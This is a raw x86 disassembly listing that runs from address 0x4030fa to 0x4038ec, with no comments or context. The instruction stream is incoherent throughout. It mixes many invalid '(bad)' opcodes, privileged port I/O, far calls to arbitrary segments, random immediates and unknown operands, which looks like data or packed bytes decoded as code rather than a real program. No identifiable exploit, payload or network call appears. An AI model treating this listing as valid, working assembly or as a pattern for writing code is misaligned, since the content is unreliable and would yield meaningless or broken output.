  4030fa:	call   0xfe27:0x493cf8f2
  403101:	pop    esi
  403102:	jg     0x403137
  403104:	test   esp,0x97608a06
  40310a:	xor    cl,dh
  40310c:	fcmovbe st,st(0)
  40310e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40310f:	arpl   WORD PTR [edx],di
  403111:	add    ecx,DWORD PTR [edi-0x36da5580]
  403117:	push   ss
  403118:	mov    esi,0xec8e561d
  40311d:	cmp    al,0x76
  40311f:	mov    WORD PTR [ebp-0xfa3df13],ds
  403125:	sbb    eax,0xf539a2e2
  40312a:	ins    BYTE PTR es:[edi],dx
  40312b:	popa   
  40312c:	xchg   esp,eax
  40312d:	repz pop ss
  40312f:	(bad)  
  403130:	dec    edi
  403131:	pusha  
  403132:	sub    ah,BYTE PTR [ebp+eiz*1+0x191f6b9a]
  403139:	fldcw  WORD PTR [esp+esi*4+0x229767b]
  403140:	pop    edi
  403141:	or     bh,bl
  403143:	es ror dh,cl
  403146:	not    BYTE PTR [esi-0x23]
  403149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40314a:	dec    esi
  40314b:	push   ss
  40314c:	pusha  
  40314d:	inc    esi
  40314e:	scas   eax,DWORD PTR es:[edi]
  40314f:	fisub  WORD PTR [ebx+0x44b1b39b]
  403155:	test   BYTE PTR [esi-0x4a],0x7c
  403159:	mov    dl,0x27
  40315b:	jae    0x4031bf
  40315d:	jns    0x403157
  40315f:	pop    ebp
  403160:	(bad)  
  403161:	in     eax,0x93
  403163:	cmp    BYTE PTR [eax+0x494fbef5],al
  403169:	out    dx,eax
  40316a:	call   0xda40c4fb
  40316f:	and    eax,0xfa0d8b06
  403174:	adc    BYTE PTR ds:0xcda7eb56,bl
  40317a:	cmp    BYTE PTR [eax-0x70a21b36],0x3e
  403181:	sar    DWORD PTR [edi+0x50],cl
  403184:	sbb    al,0x43
  403186:	inc    ebp
  403187:	shl    DWORD PTR [eax],1
  403189:	call   0x57fc10c9
  40318e:	dec    ebp
  40318f:	mov    WORD PTR [edx],ds
  403191:	xchg   edx,eax
  403192:	lea    edx,[ecx]
  403194:	ret    0x9fce
  403197:	jmp    0x809c:0x3819dbc6
  40319e:	outs   dx,BYTE PTR ds:[esi]
  40319f:	pop    ecx
  4031a0:	nop
  4031a1:	cli    
  4031a2:	cmp    BYTE PTR [esi],ch
  4031a4:	cmp    esi,DWORD PTR [esi]
  4031a6:	sbb    BYTE PTR [ebx],0x52
  4031a9:	(bad)  
  4031aa:	in     eax,dx
  4031ab:	mov    cl,bh
  4031ad:	adc    al,0xd6
  4031af:	jmp    0x40318e
  4031b1:	mov    fs,WORD PTR [ebx]
  4031b3:	adc    bl,dh
  4031b5:	push   ss
  4031b6:	iret   
  4031b7:	test   cl,0xed
  4031ba:	inc    ebp
  4031bb:	leave  
  4031bc:	mov    ah,0x5b
  4031be:	mov    eax,ds:0x351cef0a
  4031c3:	sbb    esi,DWORD PTR [ebp-0x63e7ce00]
  4031c9:	ret    0x54c4
  4031cc:	push   DWORD PTR [edi+0xd65702b]
  4031d2:	sbb    bl,BYTE PTR ds:0x67c44f57
  4031d8:	imul   esp,ecx,0x152330c1
  4031de:	cmp    al,0x6f
  4031e0:	aam    0xbb
  4031e2:	stc    
  4031e3:	cwde   
  4031e4:	jnp    0x403223
  4031e6:	ds mov al,0xe7
  4031e9:	fnstenv [ebx+0x45327ee8]
  4031ef:	scas   al,BYTE PTR es:[edi]
  4031f0:	(bad)  
  4031f1:	fnstenv [ebx]
  4031f3:	fwait
  4031f4:	lea    ecx,[eax-0x788e8e23]
  4031fa:	scas   eax,DWORD PTR es:[edi]
  4031fb:	sti    
  4031fc:	cmp    esi,DWORD PTR [ebx+eax*4+0x70189dd1]
  403203:	push   ds
  403204:	push   cs
  403205:	sub    bh,0xcd
  403208:	rcr    BYTE PTR [ecx-0x41dea1a1],1
  40320e:	jle    0x40319c
  403210:	cdq    
  403211:	div    DWORD PTR [ecx-0x3749a2e3]
  403217:	repnz and al,0x76
  40321a:	xchg   edx,eax
  40321b:	pop    ecx
  40321c:	retf   0xa870
  40321f:	ins    BYTE PTR es:[edi],dx
  403220:	shl    DWORD PTR [ecx+esi*1-0x6e7aea80],1
  403227:	ins    DWORD PTR es:[edi],dx
  403228:	out    0xb7,al
  40322a:	nop
  40322b:	fs call 0xf83e:0xb783e38e
  403233:	lods   al,BYTE PTR ds:[esi]
  403234:	jmp    0x4031e4
  403236:	add    DWORD PTR [ecx+0x349cd6af],ebx
  40323c:	xor    esp,DWORD PTR [esi]
  40323e:	fisub  DWORD PTR [esi+0x49a88be2]
  403244:	jge    0x40324b
  403246:	aas    
  403247:	test   al,0x52
  403249:	jns    0x4031f7
  40324b:	outs   dx,BYTE PTR ds:[esi]
  40324c:	and    al,0x3e
  40324e:	mov    ds:0x95f8dc80,eax
  403253:	inc    ebx
  403254:	xchg   esp,eax
  403255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403256:	adc    eax,0x5d8ae39b
  40325b:	push   ss
  40325c:	push   eax
  40325d:	das    
  40325e:	and    BYTE PTR [edi-0x1c],dl
  403261:	lods   al,BYTE PTR ds:[esi]
  403262:	mov    ah,0xde
  403264:	sub    ebp,DWORD PTR [eax-0x2764c59d]
  40326a:	mov    eax,0x55c89f8
  40326f:	xchg   DWORD PTR ds:0xea90bec9,ecx
  403275:	push   ecx
  403276:	aam    0x63
  403278:	repz or bl,BYTE PTR [ecx+0x3ecfd7a0]
  40327f:	icebp  
  403280:	imul   edi,DWORD PTR [edi-0xd3949f5],0x53cc7e60
  40328a:	xchg   ecx,eax
  40328b:	fwait
  40328c:	xchg   esp,eax
  40328d:	in     al,dx
  40328e:	xchg   edi,eax
  40328f:	bound  ebp,QWORD PTR gs:[esi+0x14]
  403293:	sub    DWORD PTR [edi],eax
  403295:	repz mov bl,0xfe
  403298:	cwde   
  403299:	les    esi,FWORD PTR [ecx-0x39]
  40329c:	aad    0x76
  40329e:	mov    eax,ds:0xd456ab2f
  4032a3:	pushf  
  4032a4:	sub    cl,BYTE PTR [ecx+0x21]
  4032a7:	scas   al,BYTE PTR es:[edi]
  4032a8:	loopne 0x40328f
  4032aa:	and    al,0x71
  4032ac:	xchg   edx,eax
  4032ad:	(bad)  
  4032ae:	fmul   DWORD PTR [ebx]
  4032b0:	jns    0x40328b
  4032b2:	or     BYTE PTR [esi-0x5f],0xc9
  4032b6:	(bad)  [esi+ecx*2+0x3589f3fc]
  4032bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032be:	add    al,0x26
  4032c0:	pop    esi
  4032c1:	jae    0x403262
  4032c3:	fdiv   DWORD PTR [edx+0x5419754]
  4032c9:	or     ch,dh
  4032cb:	call   0xceb4:0xbbc7e3c7
  4032d2:	into   
  4032d3:	mov    al,BYTE PTR ds:0x6952053a
  4032d9:	or     eax,DWORD PTR [esi+0x6679857e]
  4032df:	xchg   ecx,eax
  4032e0:	int    0x9c
  4032e2:	sti    
  4032e3:	cld    
  4032e4:	jge    0x4032e6
  4032e6:	dec    edx
  4032e7:	retf   0xc3f1
  4032ea:	push   ss
  4032eb:	dec    ebp
  4032ec:	(bad)  
  4032ee:	push   esp
  4032ef:	sbb    eax,DWORD PTR [eax+ebx*2-0x7d]
  4032f3:	mov    bl,0xcb
  4032f5:	push   ebp
  4032f6:	scas   al,BYTE PTR es:[edi]
  4032f7:	add    DWORD PTR [eax-0x16da516a],0x11
  4032fe:	push   cs
  4032ff:	pop    edi
  403300:	xor    eax,0xa46607b6
  403305:	ja     0x403372
  403307:	push   ds
  403308:	es jbe 0x40336b
  40330b:	mov    bh,0x2
  40330d:	mov    WORD PTR [edi],ss
  40330f:	mov    eax,0x83f92006
  403314:	xchg   ebp,eax
  403315:	ja     0x403363
  403317:	loop   0x40338b
  403319:	neg    DWORD PTR [ebx]
  40331b:	sub    eax,0x3c12d178
  403320:	and    ebp,DWORD PTR [edi-0x59]
  403323:	ins    DWORD PTR es:[edi],dx
  403324:	scas   al,BYTE PTR es:[edi]
  403325:	outs   dx,DWORD PTR ds:[esi]
  403326:	xchg   edi,eax
  403327:	adc    DWORD PTR [edx],edx
  403329:	rcpps  xmm1,XMMWORD PTR [eax+0x1c]
  40332d:	lods   al,BYTE PTR ds:[esi]
  40332e:	fild   WORD PTR [ebp-0x2b]
  403331:	clc    
  403332:	leave  
  403333:	adc    ch,BYTE PTR [ecx+0x6dd0655e]
  403339:	jmp    0x403348
  40333b:	lods   eax,DWORD PTR ds:[esi]
  40333c:	dec    ebp
  40333d:	mov    ebx,eax
  40333f:	jmp    0x20ad:0xcd596858
  403346:	not    DWORD PTR ds:0x1b565548
  40334c:	jmp    0xdacb83f3
  403351:	rcr    BYTE PTR [esi+0x5a],1
  403354:	pushf  
  403355:	mov    cl,0x95
  403357:	xchg   DWORD PTR [ebx-0x66],ebx
  40335a:	ficomp DWORD PTR [ecx+edx*8]
  40335d:	ins    DWORD PTR es:[edi],dx
  40335e:	jae    0x4032f8
  403360:	cmp    BYTE PTR [edi+0x5e],bl
  403363:	mov    ds:0x92804bda,al
  403368:	ror    BYTE PTR [ebp+0x6bfbc972],1
  40336e:	ss int 0x64
  403371:	jb     0x40334e
  403373:	lods   al,BYTE PTR ds:[esi]
  403374:	inc    edx
  403375:	mov    bl,0xa8
  403377:	dec    esi
  403378:	addr16 loop 0x403306
  40337b:	call   0xbe3b:0x5a63ec13
  403382:	in     eax,dx
  403383:	or     BYTE PTR [ecx+eiz*8],0xb9
  403387:	xor    edx,ebx
  403389:	and    eax,0x3a84f2ab
  40338e:	rcl    BYTE PTR [edi],0x63
  403391:	lahf   
  403392:	inc    ebp
  403393:	jge    0x403362
  403395:	mov    edx,0xd21f2f3e
  40339a:	adc    al,0x46
  40339c:	mov    ds:0x9810051d,eax
  4033a1:	or     BYTE PTR [esi],ah
  4033a3:	out    dx,eax
  4033a4:	imul   DWORD PTR [ecx]
  4033a6:	jmp    0x5fb7db7f
  4033ab:	xchg   esp,eax
  4033ac:	arpl   WORD PTR ds:0xb0fd17f2,bp
  4033b2:	xchg   DWORD PTR [ebx],edi
  4033b4:	xchg   DWORD PTR [ebp-0x2ca5ef3c],ecx
  4033ba:	xchg   edi,eax
  4033bb:	xor    eax,DWORD PTR [edi+0xb]
  4033be:	jne    0x403426
  4033c0:	(bad)  
  4033c1:	call   0x457c:0x1d9998a1
  4033c8:	(bad)  
  4033c9:	or     dh,BYTE PTR [esi-0x79]
  4033cc:	jb     0x403405
  4033ce:	lock cli 
  4033d0:	pop    es
  4033d1:	(bad)  
  4033d2:	(bad)  
  4033d3:	loopne 0x403441
  4033d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033d6:	ins    BYTE PTR es:[edi],dx
  4033d7:	jmp    0x403434
  4033d9:	xchg   edi,eax
  4033da:	fs enter 0xfc05,0x42
  4033df:	mov    bh,0x18
  4033e1:	pushf  
  4033e2:	or     ebp,DWORD PTR [eax+ebx*2+0xa]
  4033e6:	aas    
  4033e7:	imul   ebx,DWORD PTR [ecx],0xffffff9b
  4033ea:	push   ebx
  4033eb:	inc    esi
  4033ec:	icebp  
  4033ed:	xor    al,0x22
  4033ef:	inc    ebp
  4033f0:	or     BYTE PTR [ebp+ebx*8+0x5295b718],0xa4
  4033f8:	pop    esp
  4033f9:	add    BYTE PTR [edi+esi*2-0xdec58bb],al
  403400:	(bad)  
  403401:	cmp    eax,0xff10a4c8
  403406:	ret    
  403407:	inc    eax
  403408:	test   eax,0x5ab4b4f0
  40340d:	mov    cl,0xcc
  40340f:	in     al,0x9c
  403411:	call   0x6ac98e3c
  403416:	es jmp 0xaaf3:0xb4330246
  40341e:	lahf   
  40341f:	mov    ebp,0x336a3019
  403424:	ret    0x848c
  403427:	test   BYTE PTR [ebx+esi*2+0x4671520],0x9a
  40342f:	addr16 clc 
  403431:	push   eax
  403432:	and    eax,0x1d5507a0
  403437:	int    0x11
  403439:	(bad)  
  40343a:	xchg   ecx,eax
  40343b:	(bad)  
  40343c:	shl    DWORD PTR [eax+0x55],cl
  40343f:	mov    bl,0x3f
  403441:	neg    ebp
  403443:	cmp    al,0xbf
  403445:	sbb    DWORD PTR [edi],ecx
  403447:	and    al,0x44
  403449:	mov    ebp,0xd7734f9f
  40344e:	out    dx,eax
  40344f:	jb     0x40348a
  403451:	fucom  st(2)
  403453:	lods   al,BYTE PTR ds:[esi]
  403454:	adc    DWORD PTR [ebx-0x47],eax
  403457:	hlt    
  403458:	icebp  
  403459:	inc    esi
  40345a:	jns    0x4034cc
  40345c:	(bad)  
  40345d:	jl     0x40342d
  40345f:	bound  edx,QWORD PTR [esi-0x7e7e60d9]
  403465:	nop
  403466:	fs inc esp
  403468:	sub    cl,ah
  40346a:	jns    0x4033f2
  40346c:	out    dx,al
  40346d:	xlat   BYTE PTR ds:[ebx]
  40346e:	sub    eax,0x5ff3bf96
  403473:	hlt    
  403474:	add    bl,BYTE PTR fs:[ebx+ebx*1-0x3c]
  403479:	inc    ebp
  40347a:	aam    0xe5
  40347c:	jb     0x40340d
  40347e:	add    BYTE PTR [ecx],0xb9
  403481:	mov    al,ds:0x20906864
  403486:	les    ebp,FWORD PTR [esi]
  403488:	clc    
  403489:	pop    edi
  40348a:	inc    esi
  40348b:	or     eax,0x2adceacd
  403490:	js     0x403440
  403492:	cmp    al,0xc4
  403494:	push   ss
  403495:	and    bh,BYTE PTR [ebx-0xa]
  403498:	call   FWORD PTR [ecx]
  40349a:	xor    al,0x5c
  40349c:	inc    eax
  40349d:	call   0x6f1a:0x964f3999
  4034a4:	mov    ah,0x4c
  4034a6:	cwde   
  4034a7:	pop    esp
  4034a8:	mov    ds:0x2219b25,al
  4034ad:	xchg   BYTE PTR [edi],ah
  4034af:	jp     0x403517
  4034b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034b2:	push   edi
  4034b3:	retf   
  4034b4:	add    al,0x16
  4034b6:	sahf   
  4034b7:	adc    ebp,ecx
  4034b9:	inc    eax
  4034ba:	lds    ebx,FWORD PTR [ebp-0x3637572f]
  4034c0:	test   BYTE PTR [esi-0xd],0xc9
  4034c4:	fisub  WORD PTR [ebp+0x13]
  4034c7:	(bad)  
  4034c8:	cld    
  4034c9:	jmp    0x154bf35c
  4034ce:	pop    edx
  4034cf:	ss push es
  4034d1:	lods   al,BYTE PTR ds:[esi]
  4034d2:	(bad)  
  4034d3:	xlat   BYTE PTR ds:[ebx]
  4034d4:	psubsb mm7,QWORD PTR [ebx+0x31473932]
  4034db:	stc    
  4034dc:	dec    ecx
  4034dd:	(bad)  
  4034de:	popf   
  4034df:	out    dx,al
  4034e0:	xor    dl,ah
  4034e2:	sahf   
  4034e3:	rol    DWORD PTR [edx+0x4d292f54],cl
  4034e9:	or     eax,0xcffbe1d
  4034ee:	xlat   BYTE PTR ds:[ebx]
  4034ef:	jae    0x403516
  4034f1:	or     DWORD PTR [ecx-0xedaeaf7],esp
  4034f7:	test   dh,0x37
  4034fa:	clc    
  4034fb:	adc    BYTE PTR [eax],ah
  4034fd:	repnz dec edi
  4034ff:	xor    DWORD PTR [esi],edi
  403501:	pop    eax
  403502:	mov    eax,0x22a9f6ef
  403507:	jecxz  0x40355b
  403509:	push   esi
  40350a:	rcl    BYTE PTR [eax],1
  40350c:	adc    al,0x9
  40350e:	(bad)  
  40350f:	sti    
  403510:	inc    esi
  403511:	push   cs
  403512:	or     cl,ch
  403514:	push   edx
  403515:	sub    al,0xdb
  403517:	cmp    al,0x50
  403519:	repnz mov ecx,0xed306039
  40351f:	jge    0x40350a
  403521:	std    
  403522:	les    edx,FWORD PTR [edx-0x7ad6a053]
  403528:	imul   edx,DWORD PTR [ebx],0x4803eb29
  40352e:	inc    esi
  40352f:	xchg   esp,eax
  403530:	iret   
  403531:	and    BYTE PTR ds:0xada6147d,dl
  403537:	sub    DWORD PTR [ebx-0x5a],edx
  40353a:	clc    
  40353b:	fisub  WORD PTR [ecx-0x7ca92116]
  403541:	pop    edi
  403542:	sub    al,0xc4
  403544:	retf   
  403545:	(bad)  
  403546:	mov    esp,0xd8b3f3e4
  40354b:	pop    DWORD PTR [ebp+0x6f]
  40354e:	fcmovnb st,st(7)
  403550:	cmp    al,0xc1
  403552:	leave  
  403553:	(bad)  
  403554:	xor    bl,BYTE PTR [eax+eiz*4-0x5b]
  403558:	or     edx,DWORD PTR [edi-0x2f7eb416]
  40355e:	mov    ds:0xe9387650,eax
  403563:	shl    BYTE PTR [eax],0xb0
  403566:	inc    edx
  403567:	lods   al,BYTE PTR ds:[esi]
  403568:	cmp    eax,0xb4fb3b1c
  40356d:	int    0xa7
  40356f:	add    esi,esi
  403571:	mov    ecx,edi
  403573:	mov    ah,0xa2
  403575:	add    al,BYTE PTR [ebx-0x564e2e38]
  40357b:	cs mov eax,ebp
  40357e:	pushf  
  40357f:	mov    BYTE PTR [esi+0x553c8974],dl
  403585:	xchg   esi,eax
  403586:	ror    BYTE PTR [eax+eiz*8],0x87
  40358a:	xor    DWORD PTR [edi-0xe97b8fa],ebp
  403590:	pop    esp
  403591:	test   eax,ebp
  403593:	std    
  403594:	jns    0x403600
  403596:	in     eax,0xb9
  403598:	cmp    DWORD PTR [edi+esi*4],0xffffffa8
  40359c:	or     eax,0xc3406c83
  4035a1:	pop    edx
  4035a2:	(bad)  [esi-0x77668558]
  4035a8:	jecxz  0x4035dc
  4035aa:	dec    ecx
  4035ab:	(bad)  
  4035ac:	(bad)  
  4035ad:	push   eax
  4035ae:	test   al,0x7f
  4035b0:	(bad)  
  4035b1:	cli    
  4035b2:	sbb    eax,DWORD PTR [edx-0x7b]
  4035b5:	push   0xffffffab
  4035b7:	dec    ebx
  4035b8:	adc    eax,DWORD PTR [ebx+esi*2+0x32]
  4035bc:	mov    edx,DWORD PTR [edi+0x5d]
  4035bf:	add    al,0x83
  4035c1:	adc    esi,DWORD PTR [ebx-0x634165d3]
  4035c7:	and    eax,0x8e2f368d
  4035cc:	push   ebp
  4035cd:	shl    ebx,0x22
  4035d0:	jns    0x4035f9
  4035d2:	test   BYTE PTR [edx-0x3b],al
  4035d5:	adc    bl,bl
  4035d7:	fld    st(1)
  4035d9:	jmp    0x2a3a2405
  4035de:	jecxz  0x4035b7
  4035e0:	and    edx,DWORD PTR [edx-0x4f3f1d67]
  4035e6:	xor    ebx,DWORD PTR [edx+0x429826b5]
  4035ec:	fldcw  WORD PTR [edi]
  4035ee:	add    eax,0x7220b0be
  4035f3:	dec    ebx
  4035f4:	and    cl,ch
  4035f6:	jle    0x403667
  4035f8:	(bad)  
  4035f9:	or     al,0x8d
  4035fb:	lods   al,BYTE PTR ds:[esi]
  4035fc:	cs test eax,0x99e4acd0
  403602:	mov    dl,0x6e
  403604:	pxor   mm5,QWORD PTR ds:0x3780ac00
  40360b:	sbb    eax,DWORD PTR [eax+0x36d93d5]
  403611:	test   DWORD PTR [esp+eiz*4],edi
  403614:	popa   
  403615:	pop    eax
  403616:	jno    0x403644
  403618:	fstp   QWORD PTR [esi-0x1f1955a0]
  40361e:	adc    eax,0xc510a74e
  403623:	shr    DWORD PTR [ebx],0x7d
  403626:	mov    edx,0xa52e3be
  40362b:	add    al,0x63
  40362d:	popa   
  40362e:	scas   ax,WORD PTR es:[edi]
  403630:	cdq    
  403631:	mov    esi,0x2b2c260f
  403636:	push   es
  403637:	and    al,0xbe
  403639:	std    
  40363a:	pop    ss
  40363b:	jae    0x4035c4
  40363d:	mov    bl,0x8a
  40363f:	dec    edx
  403640:	fimul  WORD PTR ds:0x5c8daae0
  403646:	cmp    eax,0x8d986cef
  40364b:	outs   dx,DWORD PTR ds:[esi]
  40364c:	dec    esp
  40364d:	cvtdq2ps xmm2,XMMWORD PTR [edi-0x40]
  403651:	fnstcw WORD PTR [edx]
  403653:	mov    ?,esi
  403655:	lods   al,BYTE PTR ds:[esi]
  403656:	sub    BYTE PTR [esi-0x23],cl
  403659:	outs   dx,DWORD PTR ds:[esi]
  40365a:	dec    esi
  40365b:	das    
  40365c:	or     al,0x88
  40365e:	test   eax,0xbb3d8d0e
  403663:	sub    DWORD PTR ds:0xbd728706,ebp
  403669:	mov    ebp,0xf721fdf1
  40366e:	retw   0x8082
  403672:	rcl    BYTE PTR [edx],0x5
  403675:	rcr    DWORD PTR [eax-0x16445d03],0xd
  40367c:	xlat   BYTE PTR ds:[ebx]
  40367d:	cmp    ecx,DWORD PTR ds:0x18f3b3b4
  403683:	out    0xf,eax
  403685:	inc    ecx
  403686:	stos   DWORD PTR es:[edi],eax
  403687:	sbb    BYTE PTR [ebp-0x152faf47],ah
  40368d:	and    eax,0xf077324e
  403692:	lock (bad) [bx+si-0x92]
  403698:	test   BYTE PTR [ebx+0xe],bl
  40369b:	cmp    esp,DWORD PTR [edi-0x53]
  40369e:	dec    eax
  40369f:	rcr    dl,0x71
  4036a2:	data16 test BYTE PTR [ebp+0x288520],0xdb
  4036aa:	push   ebp
  4036ab:	jle    0x4036ba
  4036ad:	jl     0x403696
  4036af:	mov    eax,ds:0xef66a700
  4036b4:	or     BYTE PTR ss:[edx-0x32],0xfd
  4036b9:	cmp    DWORD PTR [edi],eax
  4036bb:	repz ja 0x40365c
  4036be:	inc    esp
  4036bf:	mov    al,0xd8
  4036c1:	push   ss
  4036c2:	and    al,0x25
  4036c4:	add    dl,al
  4036c6:	aad    0x6a
  4036c8:	lods   eax,DWORD PTR ds:[esi]
  4036c9:	sbb    eax,DWORD PTR [edi+eax*2-0x714ce98f]
  4036d0:	push   ebp
  4036d1:	or     DWORD PTR [ebx],esp
  4036d3:	loopne 0x4036a6
  4036d5:	(bad)  
  4036d6:	retf   
  4036d7:	and    esp,DWORD PTR [edi+0x4c]
  4036da:	adc    BYTE PTR cs:[ebx+0x4e],0xf3
  4036df:	push   edx
  4036e0:	xor    esp,ebx
  4036e2:	stos   DWORD PTR es:[edi],eax
  4036e3:	pop    ss
  4036e4:	jno    0x403739
  4036e6:	pusha  
  4036e7:	cwde   
  4036e8:	mov    bh,0x2e
  4036ea:	dec    ecx
  4036eb:	addr16 nop
  4036ed:	cwde   
  4036ee:	dec    esi
  4036ef:	je     0x403697
  4036f1:	repnz stos DWORD PTR es:[edi],eax
  4036f3:	sub    al,0x5f
  4036f5:	out    0xcf,al
  4036f7:	sub    al,0xbb
  4036f9:	pop    ss
  4036fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036fb:	pop    edx
  4036fc:	mov    ds:0x8bb66578,eax
  403701:	push   0x4e
  403703:	bound  esp,QWORD PTR [esi+0x3aa977fa]
  403709:	(bad)  
  40370a:	scas   eax,DWORD PTR es:[edi]
  40370b:	push   esp
  40370c:	sub    al,0x14
  40370e:	cwde   
  40370f:	mov    ecx,0x288fc6f6
  403714:	or     dh,dh
  403716:	xor    eax,0x75c2162b
  40371b:	nop
  40371c:	rcr    BYTE PTR [ecx-0x4e97bdf1],1
  403722:	pop    ebp
  403723:	in     al,dx
  403724:	add    BYTE PTR [ecx-0x4b],al
  403727:	sbb    DWORD PTR [eax+0x7c],esi
  40372a:	adc    ecx,DWORD PTR [ebp-0x6e]
  40372d:	inc    ebx
  40372e:	arpl   dx,cx
  403730:	xor    eax,0x861083a
  403735:	xor    DWORD PTR [eax+0x3e],0xb07f160a
  40373c:	xchg   edi,eax
  40373d:	inc    dl
  40373f:	lds    edx,FWORD PTR [ecx+ebx*8-0x456488]
  403746:	mov    DWORD PTR [esi-0x12c4412a],esi
  40374c:	cli    
  40374d:	test   al,0xfd
  40374f:	sub    eax,0xf43c0387
  403754:	cmp    DWORD PTR [ebp+0x70],ecx
  403757:	jmp    0x403786
  403759:	and    bh,0xb9
  40375c:	pop    edx
  40375d:	mov    ch,0xb1
  40375f:	imul   eax,DWORD PTR [edx],0x76325f4
  403765:	inc    ebx
  403766:	or     dh,bh
  403768:	stc    
  403769:	push   esp
  40376a:	and    ah,BYTE PTR [edx-0x1420fd5b]
  403770:	xchg   esp,eax
  403771:	outs   dx,BYTE PTR ds:[esi]
  403772:	cld    
  403773:	hlt    
  403774:	popf   
  403775:	lea    edx,[ebx]
  403777:	pop    es
  403778:	aaa    
  403779:	or     ebx,DWORD PTR [edx-0x4]
  40377c:	push   cs
  40377d:	cmp    DWORD PTR [eax-0x500a0e3],ebp
  403783:	std    
  403784:	pop    es
  403785:	out    dx,al
  403786:	push   0x15c68f89
  40378b:	inc    edi
  40378c:	mov    ?,WORD PTR [edi]
  40378e:	inc    ebx
  40378f:	in     al,dx
  403790:	xchg   edi,eax
  403791:	adc    edx,DWORD PTR ds:0xf5e3a063
  403797:	jno    0x4037a0
  403799:	gs sbb al,0x22
  40379c:	in     al,0x9d
  40379e:	iret   
  40379f:	jbe    0x4037d7
  4037a1:	inc    edi
  4037a2:	dec    eax
  4037a3:	dec    esp
  4037a4:	xor    eax,0x40b500e8
  4037a9:	bound  esi,QWORD PTR [edx]
  4037ab:	popa   
  4037ac:	jge    0x4037e3
  4037ae:	inc    esp
  4037af:	fimul  DWORD PTR [esi]
  4037b1:	pusha  
  4037b2:	and    DWORD PTR [eax+0x10d91b81],ebx
  4037b8:	or     BYTE PTR [eax-0x4b],dh
  4037bb:	mov    ah,0x9e
  4037bd:	fadd   DWORD PTR [ebp+0x70f8fc39]
  4037c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037c4:	ins    BYTE PTR es:[edi],dx
  4037c5:	cmp    BYTE PTR [eax-0x1a],dh
  4037c8:	cld    
  4037c9:	(bad)  
  4037ca:	into   
  4037cb:	add    al,0x1d
  4037cd:	(bad)  
  4037ce:	cmp    bl,BYTE PTR [edx+edi*1+0x4e]
  4037d2:	loop   0x40380f
  4037d4:	int    0x7c
  4037d6:	fild   WORD PTR [edx+0x474ff475]
  4037dc:	fs retf 0x978
  4037e0:	mov    edx,0x909be365
  4037e5:	pop    ebx
  4037e6:	fnstenv [ebx+0x2f]
  4037e9:	adc    al,0xb1
  4037eb:	xlat   BYTE PTR ds:[ebx]
  4037ec:	scas   al,BYTE PTR es:[edi]
  4037ed:	fidivr DWORD PTR [eax-0x6acc8f5c]
  4037f3:	and    al,cl
  4037f5:	dec    ebx
  4037f6:	dec    esi
  4037f7:	cmp    eax,0x3cc0316d
  4037fc:	mov    ds:0x11b8d91a,al
  403801:	arpl   WORD PTR [ebx-0x53],sp
  403804:	rcr    ecx,1
  403806:	enter  0x1ae7,0xed
  40380a:	add    ch,ch
  40380c:	xchg   edx,eax
  40380d:	mov    edi,0x3fb078d9
  403812:	jmp    0xba8e3634
  403817:	mov    eax,0x373a15a8
  40381c:	mov    edi,0xa0c384cb
  403821:	mov    esp,0x19d17ca6
  403826:	clc    
  403827:	or     edi,DWORD PTR [ebx]
  403829:	hlt    
  40382a:	lods   eax,DWORD PTR ds:[esi]
  40382b:	adc    BYTE PTR [esp+eiz*8+0x14],0x75
  403830:	mov    ch,0x46
  403832:	ja     0x4037ca
  403834:	jp     0x403870
  403836:	pop    esp
  403837:	imul   edx
  403839:	add    BYTE PTR [esi-0x300eeabb],dh
  40383f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403840:	sbb    ebx,DWORD PTR [eax+0x16]
  403843:	jmp    0xb9b9:0xf4488909
  40384a:	pop    edx
  40384b:	adc    al,dh
  40384d:	mov    dh,0x95
  40384f:	nop
  403850:	(bad)  
  403851:	out    dx,eax
  403852:	or     DWORD PTR [edx],edi
  403854:	sbb    al,0x4e
  403856:	outs   dx,BYTE PTR ds:[esi]
  403857:	xchg   esi,eax
  403858:	std    
  403859:	dec    ebx
  40385a:	jno    0x403860
  40385c:	push   0xffffff9e
  40385e:	sub    eax,0xecf176fc
  403863:	sbb    BYTE PTR [ebx],bh
  403865:	out    0xb3,al
  403867:	mov    edi,0x4591fc14
  40386c:	mov    eax,0x1c3cced2
  403871:	pop    es
  403872:	xchg   edx,eax
  403873:	and    al,0xce
  403875:	arpl   di,si
  403877:	and    edi,DWORD PTR [ebp-0x19d7ade0]
  40387d:	pop    edx
  40387e:	or     eax,0xdbf210fc
  403883:	int    0xdb
  403885:	xor    DWORD PTR [edx+0x2611a363],edx
  40388b:	out    dx,eax
  40388c:	jnp    0x403869
  40388e:	inc    edi
  40388f:	sbb    edx,DWORD PTR [ecx+0x3ea0278b]
  403895:	lahf   
  403896:	cmp    eax,0x8b2ae1d5
  40389b:	or     esi,DWORD PTR [edi-0x597a1880]
  4038a1:	ja     0x403900
  4038a3:	jl     0x403835
  4038a5:	out    0x0,al
  4038a7:	(bad)  
  4038a8:	out    0xb4,al
  4038aa:	inc    edi
  4038ab:	inc    ebp
  4038ac:	mov    dh,BYTE PTR [eax]
  4038ae:	arpl   WORD PTR [esi+0x65],cx
  4038b1:	mov    cl,0xe3
  4038b3:	(bad)
  4038b7:	ins    DWORD PTR es:[edi],dx
  4038b8:	mov    ch,0x41
  4038ba:	loope  0x403851
  4038bc:	dec    ebp
  4038bd:	mov    ebx,0x418b4ae
  4038c2:	and    ebx,DWORD PTR [ecx+eiz*2-0x54]
  4038c6:	loope  0x4038c1
  4038c8:	shl    DWORD PTR [ebx+0xb],1
  4038cb:	jecxz  0x4038c9
  4038cd:	adc    BYTE PTR [edx-0x3e721760],dl
  4038d3:	sub    BYTE PTR [ecx-0x5544867c],bh
  4038d9:	xchg   ebp,eax
  4038da:	nop
  4038db:	ror    DWORD PTR [esi],1
  4038dd:	or     DWORD PTR [eax-0x3f5ba687],ebp
  4038e3:	jns    0x40387d
  4038e5:	fcomp  QWORD PTR [eax+0x66]
  4038e8:	pop    eax
  4038e9:	push   esi
  4038ea:	xchg   ecx,eax
  4038eb:	xchg   edx,eax
  4038ec:	jl     0x40388a
